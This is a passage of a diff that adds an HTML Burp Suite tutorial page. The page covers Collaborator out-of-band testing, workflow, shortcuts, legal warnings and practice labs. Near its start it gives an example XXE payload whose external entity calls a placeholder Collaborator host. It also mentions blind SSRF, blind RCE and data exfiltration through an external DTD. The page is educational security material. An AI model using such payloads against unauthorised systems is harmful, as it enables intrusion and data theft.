+            <li>You inject it into a payload — e.g., <code>http://xyz.burpcollaborator.net</code></li>
+            <li>If the server makes a request to that subdomain, Burp logs it</li>
+            <li>The interaction proves the vulnerability exists</li>
+        </ol>
+
+        <h3>Common Uses</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🌐</span>
+                <h4>Blind SSRF</h4>
+                <p>Force the server to fetch an external URL.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📄</span>
+                <h4>Blind XXE</h4>
+                <p>Exfiltrate data via external DTD or entity.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💥</span>
+                <h4>Blind RCE</h4>
+                <p>Trigger reverse DNS lookup to confirm command execution.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📧</span>
+                <h4>Email Injection</h4>
+                <p>Detect outbound email to attacker-controlled addresses.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="text">
+<code>Example Collaborator payload in XXE:
+─────────────────────────────────────
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://xyz.burpcollaborator.net/xxe"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</code>
+        </div>
+    </section>
+
+    <!-- ===== 13 WORKFLOW ===== -->
+    <section class="section" id="workflow">
+        <span class="section-number">13 · WORKFLOW</span>
+        <h2 class="section-title">
+            <span class="icon">🔄</span>
+            Typical Burp Testing Workflow
+        </h2>
+
+        <ol>
+            <li><strong>Configure proxy</strong> — Set up browser and Burp listener.</li>
+            <li><strong>Set target scope</strong> — Define in-scope hosts.</li>
+            <li><strong>Browse manually</strong> — Map the application, discover endpoints.</li>
+            <li><strong>Review HTTP History</strong> — Identify interesting requests.</li>
+            <li><strong>Send to Repeater</strong> — Manually test parameters and edge cases.</li>
+            <li><strong>Send to Intruder</strong> — Automate fuzzing and brute-force.</li>
+            <li><strong>Run Scanner (Pro)</strong> — Automated crawling and auditing.</li>
+            <li><strong>Use Collaborator</strong> — Test for out-of-band vulnerabilities.</li>
+            <li><strong>Document findings</strong> — Note vulnerabilities with evidence.</li>
+            <li><strong>Report</strong> — Compile findings into a professional report.</li>
+        </ol>
+
+        <div class="callout">
+            <strong>💡 Pro Tip:</strong> Always test manually in Repeater before automating with Intruder. Manual testing reveals logic flaws that fuzzers miss.
+        </div>
+    </section>
+
+    <!-- ===== 14 BEST ===== -->
+    <section class="section" id="best">
+        <span class="section-number">14 · BEST PRACTICES</span>
+        <h2 class="section-title">
+            <span class="icon">✅</span>
+            Burp Suite Best Practices
+        </h2>
+        <ol>
+            <li><strong>Scope first</strong> — Set in-scope targets to avoid noise.</li>
+            <li><strong>Organize</strong> — Rename tabs, add comments, use highlights.</li>
+            <li><strong>Use keyboard shortcuts</strong> — <code>Ctrl+R</code> Repeater, <code>Ctrl+I</code> Intruder, <code>Ctrl+Space</code> send.</li>
+            <li><strong>Save project files</strong> — Don't lose hours of work (Pro).</li>
+            <li><strong>Install essential BApps</strong> — Logger++, Autorize, Param Miner.</li>
+            <li><strong>Test manually first</strong> — Repeater before Intruder.</li>
+            <li><strong>Watch for blind vulns</strong> — Use Collaborator on all inputs.</li>
+            <li><strong>Rotate User-Agents</strong> — Some apps block repeated requests.</li>
+            <li><strong>Rate-limit Intruder</strong> — Avoid crashing targets.</li>
+            <li><strong>Document as you go</strong> — Write findings immediately.</li>
+        </ol>
+
+        <h3>Essential Keyboard Shortcuts</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Shortcut</th><th>Action</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>Ctrl+R</code></td><td>Send to Repeater</td></tr>
+                    <tr><td><code>Ctrl+I</code></td><td>Send to Intruder</td></tr>
+                    <tr><td><code>Ctrl+Space</code></td><td>Send request in Repeater</td></tr>
+                    <tr><td><code>Ctrl+Shift+B</code></td><td>Base64 encode selection</td></tr>
+                    <tr><td><code>Ctrl+Shift+U</code></td><td>URL encode selection</td></tr>
+                    <tr><td><code>Ctrl+F</code></td><td>Search within messages</td></tr>
+                    <tr><td><code>Ctrl+Shift+F</code></td><td>Search in HTTP history</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ===== 15 LEGAL ===== -->
+    <section class="section" id="legal">
+        <span class="section-number">15 · LEGAL &amp; ETHICS</span>
+        <h2 class="section-title">
+            <span class="icon">⚖️</span>
+            Legal &amp; Ethical Boundaries
+        </h2>
+        <div class="callout warn">
+            <strong>⚠️ Critical Warning:</strong> Burp Suite is a powerful offensive tool. Attacking systems you don't own or have explicit written permission to test is a <strong>serious federal crime</strong>. Unauthorized access to a protected computer carries up to 10 years in prison.
+        </div>
+
+        <h3>Before You Test</h3>
+        <ul>
+            <li><strong>Get written authorization</strong> — Signed scope document.</li>
+            <li><strong>Define in-scope targets</strong> — Only test approved hosts.</li>
+            <li><strong>Agree on rate limits</strong> — Especially for Intruder attacks.</li>
+            <li><strong>Have a contact</strong> — In case something breaks.</li>
+            <li><strong>Document everything</strong> — Timestamps, commands, evidence.</li>
+        </ul>
+
+        <h3>Legal Practice Environments</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🧪</span>
+                <h4>PortSwigger Web Academy</h4>
+                <p>Free, world-class labs from the makers of Burp. Start here.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🐐</span>
+                <h4>OWASP Juice Shop</h4>
+                <p>Modern vulnerable app with 100+ challenges.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🕸️</span>
+                <h4>DVWA</h4>
+                <p>Classic vulnerable web app — SQLi, XSS, file upload.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💰</span>
+                <h4>HackerOne</h4>
+                <p>Legal bug bounties — get paid for real findings.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>Bugcrowd</h4>
+                <p>Another top bug bounty platform with public programs.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🏠</span>
+                <h4>Your Own Lab</h4>
+                <p>Run Metasploitable, WebGoat, or custom VMs locally.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== 16 CONCLUSION ===== -->
+    <section class="section" id="conclusion">
+        <span class="section-number">16 · CONCLUSION</span>
+        <h2 class="section-title">
+            <span class="icon">🎓</span>
+            Final Thoughts
+        </h2>
+        <p>
+            <strong>Burp Suite</strong> is the <strong>single most important tool</strong> in web application security testing. Whether you're hunting bugs, conducting pentests, or learning web security, Burp will be your daily companion. It's not optional — it's the foundation.
+        </p>
+        <p>
+            Master it deeply, and you'll find vulnerabilities faster, more thoroughly, and more creatively than any automated scanner. Combine it with PortSwigger Academy, and you'll develop world-class skills in weeks.
+        </p>
+        <p>
+            The learning journey:
+        </p>
+        <ol>
+            <li><strong>Install Burp Community</strong> — Free, and it comes pre-installed on Kali.</li>
+            <li><strong>Configure proxy + certificate</strong> — Get intercepting traffic working.</li>
+            <li><strong>Practice with Repeater</strong> — Manually craft and modify requests.</li>
+            <li><strong>Automate with Intruder</strong> — Learn the four attack types.</li>
+            <li><strong>Install essential BApps</strong> — Logger++, Autorize, Param Miner.</li>
+            <li><strong>Complete PortSwigger Academy</strong> — All 200+ labs, free.</li>
+            <li><strong>Hunt real bounties</strong> — Start with HackerOne or Bugcrowd.</li>
+        </ol>
+        <div class="callout">
+            <strong>🚀 Next Steps:</strong> Open Burp, complete the PortSwigger Web Security Academy labs, and start hunting on HackerOne. Within months, you'll be finding real vulnerabilities in real applications.
+        </div>
+        <p style="text-align:center; margin-top: 30px; font-size: 17px; color: #00ff88; font-weight: 600;">
+            Happy hacking — ethically. 🕷️
+        </p>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="page-footer">
+        <p>© 2025 · <span class="brand">⚡ cyber·sume</span> · Burp Suite Tools</p>
+        <p style="margin-top: 8px; font-size: 12px;">Complete Guide · Beginner to Advanced · Updated 2025</p>
+    </footer>
 
 </div>
+
+</body>
+</html>
